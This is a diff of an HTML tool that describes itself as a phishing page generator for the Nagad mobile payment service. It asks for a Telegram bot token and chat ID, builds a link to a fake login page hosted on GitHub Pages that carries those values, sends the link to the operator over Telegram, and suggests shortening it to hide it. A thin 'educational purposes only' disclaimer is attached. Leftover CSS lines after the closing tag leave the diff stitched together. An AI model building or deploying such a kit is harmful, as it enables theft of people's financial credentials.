@@ -2,109 +2,225 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-   <link rel="shortcut icon" href="https://i.ibb.co/n0yL4dR/1679248787-Nagad-Logo-1.png" />
-  <meta property="og:title" content="নগদ ফি-শিং পেজ জেনারেটর।" />
-  <meta property="og:description" content="নগদ ফি-শিং পেজ জেনারেটর।" />
-  <meta property="og:image" content="https://i.ibb.co/KWjcfSF/Nagad-Hacked.jpg" />
-  <meta name="robots" content="noindex, nofollow">
+    <link rel="shortcut icon" href="https://i.ibb.co/n0yL4dR/1679248787-Nagad-Logo-1.png" />
+    <meta property="og:title" content="নগদ ফি-শিং পেজ জেনারেটর।" />
+    <meta property="og:description" content="নগদ ফি-শিং পেজ জেনারেটর।" />
+    <meta property="og:image" content="https://i.ibb.co/KWjcfSF/Nagad-Hacked.jpg" />
+    <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>নগদ ফি-শিং জেনারেটর</title>
+    <title>Nagad Page Generator</title>
     <style>
-    	@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(-20px); }
-    to { opacity: 1; transform: translateY(0); }
-}
+        :root {
+            --primary-color: #ee462b;
+            --secondary-color: #f47920;
+            --bg-color: #f0f2f5;
+            --card-bg: #ffffff;
+        }
 
-@keyframes buttonHover {
-    from { background-color: rgba(238, 70, 43, 0.5); }
-    to { background-color: rgba(238, 70, 43, 0.8); }
-}
+        body {
+            background-color: var(--bg-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
 
-body {
-    background-color: #fafafa;
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    display: flex;
-    flex-direction: column;
-    justify-content: flex-start;
-    align-items: center;
-    height: 100vh;
-    padding-top: 20px;
-    overflow: auto;
-    overflow: hidden;
-    
-}
-.logo {
-    text-align: center;
-    margin-bottom: 10px;
-    animation: fadeIn 1s ease-in-out;
-}
-.logo img {
-    max-width: 110px;
-}
-.container {
-    background-color: #fafafa;
-    padding: 20px;
-    border-radius: 10px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-    width: 300px;
-    text-align: center;
-    animation: fadeIn 1.5s ease-in-out;
-}
-.title {
-    margin-bottom: 10px;
-    position: relative;
-}
-.title::after {
-    content: "";
-    display: block;
-    width: 100%;
-    height: 2px;
-    background-color: #C70039;
-    position: absolute;
-    bottom: -5px;
-    left: 0;
-}
-.input-group {
-    margin-bottom: 15px;
-    text-align: left;
-    animation: fadeIn 2s ease-in-out;
-}
-input[type="text"],
-input[type="number"] {
-    width: 100%;
-    padding: 10px;
-    border: 1px solid #CCCCCC;
-    border-radius: 5px;
-    box-sizing: border-box;
-    font-family: Arial, sans-serif;
-    transition: border-color 0.3s, box-shadow 0.3s;
-}
-input[type="text"]::placeholder,
-input[type="number"]::placeholder {
-    font-family: Arial, sans-serif;
-    color: #999999;
-}
-input:focus {
-    border-color: #ee462b;
-    box-shadow: 0 0 5px rgba(238, 70, 43, 0.5);
-    outline: none;
-}
-input.invalid {
-    border-color: red;
-}
-#loginButton {
-    background-color: transparent;
-    color: #ee462b;
-    border: 2px solid #ee462b;
-    padding: 8px 15px; 
-    border-radius: 20px; 
-    cursor: pointer;
-    width: 100%;
-    display: flex;
-    justify-content: center; 
-    align-items: center;
+        .main-wrapper {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+            animation: fadeInDown 0.8s ease;
+        }
+
+        .logo img {
+            max-width: 130px;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            animation: zoomIn 0.5s ease;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: bold;
+            color: var(--primary-color);
+            margin-bottom: 25px;
+            position: relative;
+            padding-bottom: 10px;
+        }
+
+        .title::after {
+            content: "";
+            width: 50px;
+            height: 3px;
+            background: var(--primary-color);
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 2px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group p {
+            margin: 0 0 8px 5px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #555;
+        }
+
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #eee;
+            border-radius: 12px;
+            box-sizing: border-box;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 8px rgba(238, 70, 43, 0.15);
+        }
+
+        #loginButton {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(238, 70, 43, 0.3);
+        }
+
+        #loginButton:active {
+            transform: scale(0.98);
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .footer a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes zoomIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+    <div class="logo">
+        <img src="https://i.ibb.co/wJz2fPb/IMG-20240718-164357-removebg-preview-1.png" alt="Nagad Logo">
+    </div>
+
+    <div class="container">
+        <div class="title">নগদ পেজ জেনারেটর</div>
+        
+        <div class="input-group">
+            <p>Telegram Bot Token</p>
+            <input type="text" placeholder="Paste your token here" id="telegramToken">
+        </div>
+
+        <div class="input-group">
+            <p>Your Chat ID</p>
+            <input type="number" placeholder="Ex: 5080596463" id="chatId">
+        </div>
+
+        <button id="loginButton">Generate Link</button>
+    </div>
+
+    <div class="footer">
+        Developed by <a href="https://sujon0xff.github.io/" target="_blank">Sujon Islam</a><br>
+        Join our <a href="https://t.me/Freedom369_4u" target="_blank">Telegram Channel</a>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginButton').addEventListener('click', function() {
+        const token = document.getElementById('telegramToken').value.trim();
+        const chatId = document.getElementById('chatId').value.trim();
+        
+        if (token && chatId) {
+            // আপনার GitHub Pages এর লিংক এখানে সেট করা হয়েছে
+            const githubUser = "K1245780"; // আপনার ইউজারনেম
+            const repoName = "nogad"; // আপনার রিপোজিটরি নাম
+            const pageLink = `https://${githubUser}.github.io/${repoName}/login.html?token=${token}&id=${chatId}`;
+            
+            const message = `🔗 <b><u>আপনার পেজ লিংক তৈরি হয়েছে:</u></b>\n\n🎣 <b>Nagad Link:</b>\n${pageLink}\n\n` +
+                          `<blockquote>🔖 নিচের লিংকটি শর্ট করে ব্যবহার করুন।</blockquote>\n` +
+                          `<b>Shorten link: https://t.ly/</b>\n\n` +
+                          `<blockquote>⚠️ এটি শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে তৈরি।</blockquote>`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('সফল হয়েছে! লিংক আপনার টেলিগ্রামে পাঠানো হয়েছে।');
+                } else {
+                    alert('ভুল হয়েছে: ' + data.description);
+                }
+            })
+            .catch(error => {
+                alert('Error: ' + error.message);
+            });
+        } else {
+            alert('দয়া করে সঠিক Token এবং Chat ID দিন।');
+        }
+    });
+</script>
+
+</body>
+</html>
     font-family: Arial, sans-serif;
     font-size: 17px;
     transition: background-color 0.3s, transform 0.3s;
@@ -319,3 +435,4 @@ ${link}
     </script>
 </body>
 </html>
+
